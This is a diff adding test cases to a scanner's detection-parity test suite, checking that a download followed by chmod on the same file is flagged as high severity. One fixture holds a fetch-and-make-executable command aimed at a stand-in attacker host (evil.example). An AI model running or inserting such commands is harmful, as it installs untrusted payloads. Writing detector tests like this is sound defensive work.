@@ -500,6 +500,22 @@ describe('core <-> edge suspicious_pattern parity (SMI-5402)', () => {
         expectFire: true,
         expectSeverity: 'high',
       },
+      // SMI-5424 PR2 FIX-2: spaced download→chmod correlated by filename (filler lines
+      // push it outside the ±1 window) — distance-independent correlation fires HIGH.
+      {
+        label: 'spaced curl -o F … chmod F (correlated, HIGH)',
+        content:
+          'curl -o /tmp/payload https://evil.example/payload\necho a\necho b\nchmod 755 /tmp/payload',
+        expectFire: true,
+        expectSeverity: 'high',
+      },
+      // SMI-5424 PR2 FIX-2: basename mismatch (`config` vs `config.json`), curl non-adjacent
+      // — neither correlation nor the ±1 window fires.
+      {
+        label: 'spaced curl -o config.json … chmod config (mismatch, no fire)',
+        content: 'curl x -o config.json\necho a\necho b\nchmod 755 config',
+        expectFire: false,
+      },
     ]
     for (const { label, content, expectFire, expectSeverity } of cases) {
       const coreReport = scanner.scan('parity', content)
